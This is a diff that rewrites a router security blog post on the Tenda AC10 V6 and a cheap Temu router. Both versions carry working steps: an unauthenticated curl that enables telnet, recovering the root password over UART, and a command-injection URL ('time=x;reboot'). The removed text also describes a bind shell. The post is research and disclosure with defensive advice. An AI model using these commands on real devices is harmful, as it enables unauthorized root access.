@@ -3,71 +3,68 @@ title = "Tenda, Temu, and the Root Password Printed on the Serial Console"
 date = "2026-08-03"
 +++
 
-A Tenda AC10 V6 bought off Amazon turned out to have a bug so dumb it deserved verification. The exercise ended with the entire firmware image decrypted using keys harvested from a factory reset. It's the best argument I've seen in months for why consumer router security is where it is.
+A recent security review of the Tenda AC10 V6 highlights common hardware security oversights in consumer routers: an unauthenticated endpoint enables a Telnet daemon, and the dynamically generated root password is printed directly to the serial console during factory resets.
 
-## The roadblock chain
+## Enabling Telnet without authentication
 
-Recon first. One researcher's repo on the AC18 alone documents, by my count from the markdown filenames, well over a dozen separate bugs. Each is independently able to reach code execution. Ten years of this pattern, a new "Tenda accidentally left in a backdoor" story every couple of years. So the baseline expectation isn't whether there's a bug. It's which flavor.
+On this generation of Tenda hardware, requesting `http://<router>/goform/telnet` enables the Telnet service without any authentication check. Sending a simple GET or POST to that URL flips the service from closed to listening on port 23.
 
-The `/goform/telnet` bug on the AC20 is my new benchmark for shameless. Visiting a URL `http://<router>/goform/telnet`, no authentication, turns telnet on. That's it. That's the feature. Verified on his box: curl the endpoint, telnet flips from refused to listening. Which leaves one problem: the telnet has a root password, and the root password's hash lives in the shadow file of firmware that Tenda started encrypting in this hardware generation.
+The challenge was determining the root password. In earlier generations, the password hash resided in the shadow file within an unencrypted firmware image. Starting with the AC10 V6, Tenda encrypted the firmware updates.
 
-## The password scheme
+## Password generation logic
 
-The AC8 generation's scheme leaked well enough to be public: take the last two bytes of the router's MAC address, available free with an ARP request, concatenate them in swapped order against a magic string, base64 the result, that's the root password.
+In earlier models like the AC8, the password generation algorithm was reverse-engineered from firmware strings:
 
 ```text
-MAC:            xx:xx:xx:xx:NC:00        # from `arp -a`, free
-magic string:   NC00                     # per-generation secret
+MAC:            xx:xx:xx:xx:NC:00        # read via `arp -a`
+magic string:   NC00                     # generation-specific constant
 build:          base64( magic[0:2] + mac[-2] + mac[-1] )
-                → the root password
+                -> root password
 ```
 
-Except the AC10 V6 didn't take it. Reading the writeup explains why: the magic string is per-device-line and only Tenda knows it. Different string, unreachable, firmware encrypted so you can't extract it. Circular problem: the password needs a string, the string needs the firmware, the firmware needs the password.
+On the AC10 V6, the magic string changed, and the encrypted firmware prevented extracting it directly from vendor images.
 
-## The break
+## Capturing credentials over UART
 
-The break is the kind I love, because it's not an exploit at all. It's a reading-comprehension bug. Ask: what does the device *do with* the password after building it? It prints it. Routers don't have screens, but the SoC has serial console pads right there on the PCB. The console is enabled, streaming every kernel and userspace line as usual.
+During reboot or factory reset, the router's system-on-chip outputs kernel and boot messages over UART pads exposed on the PCB. 
 
-So: attach a serial tap, hold the factory reset button, and watch boot. During re-provisioning the device logs the pre-base64 password material, and then, because Tenda, the base64-encoded result right after it. Root password, caught live. And with root on the device came `decrypt_firmware`, the binary holding the keys to the encrypted image. Ed's now got the firmware keys for the whole generation, pending a lawyer conversation before publishing them.
+Connecting a USB-to-UART serial adapter and holding the factory reset button captures the re-provisioning log. During this routine, the firmware prints the pre-encoded password components followed by the base64-encoded root password directly to the serial output. Logging in via Telnet with that password yields a root BusyBox shell.
 
 ```bash
-# the whole attack, in commands:
-curl http://192.168.0.1/goform/telnet     # enable telnet, no auth
-arp -a                                     # get router MAC, free
-# serial tap on PCB pads → screen output
-# hold reset → watch boot log catch:
-#   "step 1" + pre-b64 password + b64-encoded root password
+# workflow summary:
+curl http://192.168.0.1/goform/telnet     # start telnet service
+arp -a                                     # capture MAC address
+# monitor serial console during factory reset:
+# logs display cleartext and base64-encoded password
 telnet 192.168.0.1
-# root / <that password> → shell (BusyBox, no id/uname applets)
+# authenticate as root with recovered password
 ```
 
-## The Temu device, and why I love this workflow
+From root access, researchers recovered the `decrypt_firmware` binary, yielding the AES keys needed to decrypt the entire firmware line.
 
-The earlier $5 Temu router shows the full research loop that this community keeps proving out. It maps to how I'd want any junior to learn firmware work:
+## Analyzing white-label routers
+
+A similar exercise on a low-cost white-label router ordered via Temu illustrates standard embedded firmware reverse-engineering steps:
 
 ```bash
-# 1. firmware dump without a screwdriver touching a flash chip
-#    (device has a "firmware backup" page in its CN-language web UI)
+# 1. extract firmware from backup function in the web interface
 curl http://192.168.1.1/... -o full.bin
-binwalk -e full.bin          # squashfs falls out
-# 2. find the request handler
-#    network tab shows: POST protocol.csp?fname=net&option=wizard_config
-grep -r "protocol.csp" squashfs-root/   # → lighttpd proxy.conf → port 81
-grep -r "wizard_config" squashfs-root/  # → commuos binary (the web server)
-# 3. Ghidra: strings → wizard_config cross-ref → dispatch table
-#    (array of {char* name, void (*handler)()})
-# 4. read time_config handler:
-#    get_param(request, "time") → sprintf(time_buf, "date %s", t)
-#    → system(time_buf)     ← there it is
-# 5. verify:
-curl 'http://192.168.1.1/protocol.csp?fname=net&option=time_config&time=x;reboot&fnc=set&<stolen token>'
-#    device reboots = command injection confirmed
+binwalk -e full.bin          # unpack squashfs filesystem
+
+# 2. trace web request handlers
+grep -r "protocol.csp" squashfs-root/   # web server routing
+grep -r "wizard_config" squashfs-root/  # locate binary handler
+
+# 3. inspect binary in Ghidra to locate dispatch table
+# 4. locate command injection sink:
+#    get_param(request, "time") -> sprintf(time_buf, "date %s", t) -> system(time_buf)
+
+# 5. verify execution:
+curl 'http://192.168.1.1/protocol.csp?fname=net&option=time_config&time=x;reboot&fnc=set&<token>'
 ```
 
-The `date %s` handler takes a URL parameter, `sprintf`s it into a buffer, and `system()`s it. The wrapper was presumably supposed to sanitize. Testing that assumption costs one curl. From there the pivots are all classic: `ps` output written into `/webs` (the lighttpd docroot, writable) and read back with `curl hehe` for a process dump; `telnetd` with `-p 4444 -l /bin/ash` as a bind shell, which half-worked around an IFS quirk by instead abusing the device's own `upload.cgi`, the firmware-upload handler, to plant a script in `/tmp/firmware`, `chmod +x`, execute, netcat, root.
+The web server passed parameters from the `time` parameter directly into `sprintf` and `system()` without input sanitization. Once command execution was confirmed, planting a script in `/tmp/` and spawning a bind shell provided full administrative control.
 
-The disclosure ending is the part that should bother regulators more than it does: he couldn't identify a vendor to tell. No company, no PSIRT, nothing. A vulnerability with no owner gets published, correctly. The supply chain produced the bug and then dissolved when it came time to fix it.
+## Firmware security realities
 
-## The pattern that keeps repeating
-
-Firmware encryption on a router isn't security, it's an admission. You encrypt when you have something to hide, occasionally a legitimate IP concern, usually backdoor passwords. The Tenda pattern is a decade long and counting. Every break follows the same shape: not a clever memory-corruption, but a design so bad the firmware tells you the answer on a console tap. The practical defense hasn't changed since the first backdoor story: if you ship consumer networking gear with any credential material derived from secrets *stored on the same device as the credential*, you've built a self-defeating scheme. Someone with a $10 UART adapter and a free afternoon will prove it.
+Deriving default credentials from device metadata (like MAC addresses) and pre-shared constants provides little protection when the generation algorithm is embedded in the hardware itself. If physical debug pads remain active in production, serial console output will quickly reveal hardcoded logic. Hardening embedded devices requires disabling manufacturing debug consoles on production boards and requiring unique, random passwords generated at initial setup.
